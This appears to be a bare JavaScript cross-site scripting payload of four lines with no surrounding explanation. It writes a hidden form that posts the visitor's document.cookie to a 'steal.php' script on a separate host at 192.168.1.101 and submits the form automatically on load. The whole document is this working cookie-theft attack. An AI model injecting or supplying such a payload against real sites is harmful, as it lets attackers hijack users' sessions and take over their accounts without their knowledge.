document.write("<form action='http://192.168.1.101:808/steal.php' name='exploit' method='post' style='display:none'>");
document.write("<input type='hidden' name='data' value='"+document.cookie+"'>");
document.write("</form>");
document.exploit.submit();